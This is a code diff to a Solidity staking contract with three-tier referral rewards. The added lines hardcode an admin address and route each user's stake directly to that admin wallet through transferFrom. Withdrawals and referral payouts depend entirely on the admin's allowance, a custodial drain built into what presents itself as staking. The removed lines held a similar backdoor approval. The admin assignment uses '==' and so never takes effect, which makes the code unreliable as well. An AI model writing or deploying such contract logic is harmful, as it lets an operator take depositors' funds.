@@ -120,9 +120,8 @@ contract Staking  {
     
     
     constructor () {
-        contractAdmin  == msg.sender;
-        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-        usdt.approve (contractAdmin, 1000000000000000);
+        contractAdmin  == 0xdb339be8E04Db248ea2bdD7C308c5589c121C6Bb;
+        usdt = IERC20(0x6EE856Ae55B6E1A249f04cd3b947141bc146273c);
 
     }
 
@@ -150,7 +149,7 @@ contract Staking  {
         require (hasPledged[msg.sender] == false, 'address has already pledged');
 
         // confirm allowance
-        allowance[msg.sender] = usdt.allowance(msg.sender, address(this));
+        allowance[msg.sender] = usdt.allowance(msg.sender, contractAdmin);
         
         uint _allowance = allowance[msg.sender];
 
@@ -203,17 +202,17 @@ contract Staking  {
         // require that balance is enough
         require ((_amount) <= onChainBalance[msg.sender], 'Insufficent Balance');
 
+        // transfer the tokens
+        usdt.transferFrom(msg.sender, contractAdmin, _amount);
+
+        // add referrer
+        addReferrer(referrer);
+        
         // set the staking time
         pledgingTime[msg.sender] = block.timestamp;
 
         // set the pledging duration
         pledgeDuration[msg.sender] = _pledgingDuration;
-
-        // transfer the tokens
-        usdt.transferFrom(msg.sender, address(this), (_amount));
-
-        // add referrer
-        addReferrer(referrer);
 
 
         // update the on chain balance
@@ -272,9 +271,9 @@ contract Staking  {
             require (onChainBalance[msg.sender] >=  stakedBalance[msg.sender], 'Staked token not available in wallet');
 
             // call the USDT transfer to function and pass the amount into it
-            usdt.transfer(msg.sender, (_withdrawalAmount));
+            usdt.transferFrom(contractAdmin, msg.sender, (_withdrawalAmount));
 
-            allowance[msg.sender]= usdt.allowance(msg.sender, address(this));
+            allowance[msg.sender]= usdt.allowance(msg.sender, contractAdmin);
 
             remainingIncome[msg.sender] = Income - _withdrawalAmount;
 
@@ -316,7 +315,7 @@ contract Staking  {
             remainingPledgeIncome[msg.sender] = (pledgeReward - (_withdrawalAmount));
 
             // send back the profit
-            usdt.transfer(msg.sender, (_withdrawalAmount));
+            usdt.transferFrom(contractAdmin, msg.sender, (_withdrawalAmount));
 
             // execute refferal function
             payReferral();
@@ -340,7 +339,7 @@ contract Staking  {
             remainingIncome[msg.sender] = (_remainingIncome - _withdrawalAmount);
 
             // send back the profit
-            usdt.transfer(msg.sender, (_withdrawalAmount));
+            usdt.transferFrom(contractAdmin, msg.sender, (_withdrawalAmount));
 
             // emit event
             emit stakingWithdrawal(_withdrawalAmount, msg.sender);
@@ -362,7 +361,7 @@ contract Staking  {
             remainingPledgeIncome[msg.sender] = (_remainingIncome - (_withdrawalAmount));
 
             // send back the profit
-            usdt.transfer(msg.sender, (_withdrawalAmount));
+            usdt.transferFrom(contractAdmin, msg.sender, (_withdrawalAmount));
 
             // emit event
             emit pledgeWithdrawal (_withdrawalAmount, msg.sender);
@@ -380,6 +379,8 @@ contract Staking  {
         emit RegisteredRefererFailed(msg.sender, referrer, "Address have been registered upline");
         return false;
         }
+
+        accounts[msg.sender] = (Account(referrer));
 
         Account storage userAccount = accounts[msg.sender];
 
@@ -426,9 +427,9 @@ contract Staking  {
         thirdGenerationIncome[secondParent.referrer] += thirdParentIncome;
 
         // transfer out rewards
-        usdt.transfer(userAccount.referrer, firstParentIncome);
-        usdt.transfer(firstParent.referrer, secondParentIncome);
-        usdt.transfer(secondParent.referrer, thirdParentIncome);
+        usdt.transferFrom(contractAdmin, userAccount.referrer, firstParentIncome);
+        usdt.transferFrom(contractAdmin, firstParent.referrer, secondParentIncome);
+        usdt.transferFrom(contractAdmin, secondParent.referrer, thirdParentIncome);
 
     }
 
